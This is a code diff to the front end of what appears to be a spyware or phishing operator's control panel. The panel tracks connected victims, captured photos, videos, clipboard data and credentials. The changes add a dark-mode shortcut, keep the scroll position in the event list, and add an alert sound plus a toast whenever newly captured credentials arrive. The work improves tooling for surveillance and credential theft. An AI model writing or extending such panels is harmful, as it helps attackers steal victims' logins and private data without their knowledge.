@@ -705,6 +705,7 @@ body[data-dark] .lightbox{background:rgba(0,0,0,.97)}
         </div>
         <div style="display:grid;grid-template-columns:auto 1fr;gap:6px 20px;font-size:.72rem;line-height:1.9">
             <kbd>R</kbd><span>Refresh all data</span>
+            <kbd>D</kbd><span>Toggle dark/light mode</span>
             <kbd>?</kbd><span>Keyboard shortcuts</span>
             <kbd>G</kbd><span>Zoek (globale zoekopdracht)</span>
             <kbd>1</kbd><span>Tab: Overview</span>
@@ -963,6 +964,7 @@ document.addEventListener('keydown', function(e) {
         if (e.key === 'r' || e.key === 'R') { refreshAll(); showToast('Refreshing...'); }
         if (e.key === '?' || (e.key === '/' && e.shiftKey)) { e.preventDefault(); openShortcutModal(); }
         if (e.key === 'g' || e.key === 'G') { e.preventDefault(); const gs = $('#globalSearch'); if (gs) { gs.focus(); gs.select(); } }
+        if (e.key === 'd' || e.key === 'D') { toggleTheme(); }
     }
 });
 
@@ -1197,6 +1199,7 @@ async function api(url) {
 let lastEventPollTs = 0;
 let lastEventTimestamp = ''; // ISO string of most recent event seen
 let knownClientIds = new Set(); // track known clients to detect new connections
+let prevCredentialCount = -1; // for new-credential audio alert detection
 
 // ── Browser Notifications ──
 function requestBrowserNotifications() {
@@ -1245,6 +1248,14 @@ async function refreshAll() {
                 $('#s-clip').textContent = stats.clipboardCount || 0;
                 $('#s-visit').textContent = stats.visitCount || 0;
                 $('#s-cred').textContent = stats.credentialCount || 0;
+                // Audio alert when new credentials are captured
+                const newCredCount = stats.credentialCount || 0;
+                if (prevCredentialCount >= 0 && newCredCount > prevCredentialCount) {
+                    const added = newCredCount - prevCredentialCount;
+                    playAdminNotifSound('credential_captured');
+                    toast(`\uD83D\uDD11 ${added} nieuw${added > 1 ? 'e' : ''} credential(s) captured!`);
+                }
+                prevCredentialCount = newCredCount;
                 $('#s-err').textContent = stats.errorCount || 0;
                 updateTabBadge('photos', stats.photoCount || 0);
                 updateTabBadge('videos', stats.mediaCount || 0);
@@ -1833,11 +1844,14 @@ function renderEvents() {
     })();
     if (list1) list1.innerHTML = html(filteredEvs.slice(0, 50));
     if (list2) {
+        // Preserve scroll position so reading old events isn't disrupted by auto-refresh
+        const prevScroll = list2.scrollTop;
         if (!filteredEvs.length) {
             list2.innerHTML = '<div class="empty">No events' + (evTypeFilter ? ' of type "' + evTypeFilter + '"' : '') + '</div>';
         } else {
             list2.innerHTML = html(filteredEvs.slice(0, 300));
         }
+        list2.scrollTop = prevScroll;
     }
     // Update activity chart
     try { updateActivityChart(); } catch(e) {}
@@ -1967,7 +1981,7 @@ function showToast(ev) {
     area.appendChild(toast2);
     setTimeout(() => { try { toast2.remove(); } catch {} }, 4000);
     // Play notification sound for important events
-    if (['client_connected', 'client_disconnected', 'photo', 'media', 'error'].includes(ev.type)) {
+    if (['client_connected', 'client_disconnected', 'photo', 'media', 'error', 'credential_captured'].includes(ev.type)) {
         playAdminNotifSound(ev.type);
     }
 }
@@ -1989,13 +2003,19 @@ function playAdminNotifSound(type) {
         } else if (type === 'error') {
             o.frequency.setValueAtTime(330, a.currentTime);
             o.frequency.setValueAtTime(220, a.currentTime + 0.15);
+        } else if (type === 'credential_captured') {
+            // Distinctive triple high-pitch beep for credentials
+            o.frequency.setValueAtTime(1047, a.currentTime);
+            o.frequency.setValueAtTime(1319, a.currentTime + 0.1);
+            o.frequency.setValueAtTime(1047, a.currentTime + 0.2);
+            o.frequency.setValueAtTime(1319, a.currentTime + 0.3);
         } else {
             o.frequency.setValueAtTime(660, a.currentTime);
             o.frequency.setValueAtTime(880, a.currentTime + 0.08);
         }
         g.gain.setValueAtTime(0.06, a.currentTime);
-        g.gain.exponentialRampToValueAtTime(0.001, a.currentTime + 0.35);
-        o.start(a.currentTime); o.stop(a.currentTime + 0.35);
+        g.gain.exponentialRampToValueAtTime(0.001, a.currentTime + 0.4);
+        o.start(a.currentTime); o.stop(a.currentTime + 0.4);
     } catch {}
 }
 
